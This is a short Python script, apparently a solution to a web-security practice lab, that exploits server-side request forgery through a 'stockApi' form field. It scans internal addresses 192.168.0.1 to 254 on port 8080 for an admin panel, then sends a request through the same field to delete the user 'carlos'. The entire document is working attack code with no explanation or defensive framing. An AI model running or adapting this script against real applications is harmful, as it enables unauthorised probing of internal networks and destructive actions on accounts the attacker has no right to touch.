import requests
import sys
import urllib3
urllib3.disable_warnings()

def generate_data(X):
    data={
        'stockApi':f'http://192.168.0.{X}:8080/admin'
    }
    return data

try:
    url=sys.argv[1]

except IndexError:
    print(f"[+] Syntax : python3 {sys.argv[0]} <url>")


if __name__=='__main__':
    path='/product/stock'
    content={'Content-Type': 'application/x-www-form-urlencoded'}
    s=requests.Session()
    res={}
    r_text=""
    for i in range(1,255):
        res=generate_data(i)
        r=s.post(url+path,headers=content,data=res)
        if r:
            r_text=r.text
            print(r_text)
            print('[+] Result Found ')
            print(f"url => {res['stockApi']}")
            break
    if res['stockApi']!='' and 'carlos' in r_text:
        print('[+] Delete carlos user ..')
        res['stockApi']+="/delete?username=carlos"
        r=s.post(url+path,headers=content,data=res)
        print('[+] Complete ')
    else:
        print('[-] Not Found')

    